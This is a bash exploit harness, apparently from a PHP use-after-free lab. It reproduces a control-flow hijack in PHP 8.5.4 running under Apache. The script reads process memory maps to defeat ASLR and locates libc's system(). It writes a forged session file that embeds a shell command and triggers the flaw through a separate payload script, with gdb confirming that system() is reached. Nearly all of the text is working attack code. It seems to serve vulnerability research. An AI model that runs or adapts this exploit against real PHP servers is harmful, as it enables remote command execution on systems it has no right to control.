#!/bin/bash
set -u
ROOT=/opt/php-uaf-lab
MODULE=$ROOT/build/php-8.5.4-apache-clean/libs/libphp.so
LIBC=/usr/lib/x86_64-linux-gnu/libc.so.6
PORT=18085
SESS=$ROOT/sessions/apache-clean
OUT=$ROOT/results/bgctx/apache-session-callback-clean-repetitions.txt
SKIPS=$ROOT/results/bgctx/apache-session-callback-clean-layout-skips.txt
if nm -an "$MODULE"|grep -q -E 'bg_hijack|bg_write_target';then echo 'FAIL: lab symbol linked';exit 1;fi
: >"$OUT";: >"$SKIPS";success=0;attempt=0
while [ "$success" -lt 3 ] && [ "$attempt" -lt 20 ];do
 attempt=$((attempt+1));run=$((success+1));marker=/tmp/apache-session-callback-marker-$run
 glog=$ROOT/results/bgctx/apache-session-callback-clean-gdb-$run.txt
 response=$ROOT/results/bgctx/apache-session-callback-clean-response-$run.txt
 rm -f "$marker" "$glog" "$response"
 systemctl restart php-uaf-apache-trace;sleep .3
 ctl=$(systemctl show -p MainPID --value php-uaf-apache-trace);parent=$(pgrep -P "$ctl" -o);p=$(pgrep -P "$parent" -o)
 rm -f "$SESS"/*;python3 $ROOT/bgctx/unserialize-prime.py "$PORT"
 heap=$(python3 - "$p" <<'PYMAP'
import sys
for x in open(f'/proc/{sys.argv[1]}/maps'):
 p=x.split();a,b=[int(q,16) for q in p[0].split('-')]
 if p[1]=='rw-p' and len(p)==5:
  h=(a+0x1fffff)&~0x1fffff
  if h+0x200000<=b:print(hex(h));break
PYMAP
)
 d=$(python3 -c "print(hex(int('$heap',16)+0x1c6000))")
 actual=$(gdb -q -batch -p "$p" -ex 'p/x basic_globals.unserialize.data' -ex detach -ex quit 2>/dev/null|awk '/\$1 =/{print $3}')
 module_base=$(grep "$MODULE" /proc/$p/maps|grep 'r--p 00000000'|cut -d- -f1)
 ps_off=$(nm -an "$MODULE"|awk '$3=="ps_serializers"{print $1}')
 target=$(python3 -c "print(hex(int('$module_base',16)+int('$ps_off',16)+0x28))")
 fake_dtor=$(python3 -c "print(hex(int('$d',16)-0x1fe8))")
 used=$(python3 -c "print((int('$target',16)-(int('$fake_dtor',16)+16))//16)")
 libc_base=$(grep "$LIBC" /proc/$p/maps|grep 'r--p 00000000'|cut -d- -f1)
 system_off=$(nm -D "$LIBC"|awk '$3=="system@@GLIBC_2.2.5"{print $1}')
 system=$(python3 -c "print(hex(int('$libc_base',16)+int('$system_off',16)))")
 # tmp_var accepts arbitrary negative indices. Large positive indices instead
 # allocate a new dtor page, so retain only naturally suitable ASLR layouts.
 if [ "$used" -gt 1017 ];then
  echo "ATTEMPT=$attempt SKIP=target_above_reclaim WORKER=$p HEAP=$heap MODULE_BASE=0x$module_base USED=$used" >>"$SKIPS";continue
 fi
 tmp=$(mktemp);printf 'RUN=%d ATTEMPT=%d WORKER=%s MODULE_BASE=0x%s HEAP=%s D_PREDICTED=%s D_ACTUAL=%s PS_DECODE=%s LIBC_BASE=0x%s SYSTEM=%s USED=%s\n' "$run" "$attempt" "$p" "$module_base" "$heap" "$d" "$actual" "$target" "$libc_base" "$system" "$used" >>"$tmp"
 python3 - "$p" "$target" >>"$tmp" <<'PYMEM'
import sys
p,a=int(sys.argv[1]),int(sys.argv[2],0)
with open(f'/proc/{p}/mem','rb',buffering=0) as f:f.seek(a-16);print('BEFORE='+f.read(48).hex())
PYMEM
 python3 - "$SESS/sess_victim" "$system" "$run" <<'PYSEED'
import sys
cmd=f'printf APACHE_SESSION_CALLBACK_{sys.argv[3]}>/tmp/apache-session-callback-marker-{sys.argv[3]} #|i:{int(sys.argv[2],0)};'.encode();open(sys.argv[1],'wb').write(cmd)
PYSEED
 chown www-data:www-data "$SESS/sess_victim";chmod 600 "$SESS/sess_victim"
 cat >/tmp/apache-session-callback-$run.gdb <<'GDB'
set pagination off
break system
commands
 silent
 printf "APACHE_SESSION_CALLBACK_HIT system=%p command=",$pc
 x/s $rdi
 bt 12
 continue
end
continue
GDB
 gdb -q -batch -p "$p" -x /tmp/apache-session-callback-$run.gdb >"$glog" 2>&1&g=$!;sleep .3
 python3 $ROOT/bgctx/unserialize-session-callback-apache-final.py "$PORT" "$d" "$target" "$system" >"$response" 2>&1||true
 for i in $(seq 1 300);do [ -f "$marker" ]&&break;sleep .02;done
 printf 'MARKER=%s\n' "$(cat "$marker" 2>/dev/null||echo MISSING)" >>"$tmp"
 grep -m1 'APACHE_SESSION_CALLBACK_HIT' "$glog"|sed 's/^/CONTROL=/' >>"$tmp"
 grep -A12 -m1 'APACHE_SESSION_CALLBACK_HIT' "$glog"|tail -12|sed 's/^/STACK=/' >>"$tmp"
 python3 - "$p" "$target" >>"$tmp" <<'PYMEM'
import sys
p,a=int(sys.argv[1]),int(sys.argv[2],0)
with open(f'/proc/{p}/mem','rb',buffering=0) as f:f.seek(a-16);print('AFTER='+f.read(48).hex())
PYMEM
 current=$(pgrep -P "$parent" -o 2>/dev/null||true);printf 'WORKER_AFTER=%s\n' "$current" >>"$tmp"
 grep -q 'HTTP/1.1 200 OK' "$response"&&echo HTTP_200=yes >>"$tmp"||echo HTTP_200=no >>"$tmp";echo >>"$tmp"
 kill "$g" 2>/dev/null||true;wait "$g" 2>/dev/null||true
 if [ "$(cat "$marker" 2>/dev/null||true)" = "APACHE_SESSION_CALLBACK_$run" ];then cat "$tmp" >>"$OUT";success=$((success+1));else cat "$tmp" >>"$SKIPS";fi
 rm -f "$tmp"
done
[ "$success" -eq 3 ]||{ echo "FAIL successes=$success attempts=$attempt";exit 1;}
cat "$OUT";echo "LAYOUT_SKIPS=$(wc -l <"$SKIPS") attempts=$attempt"
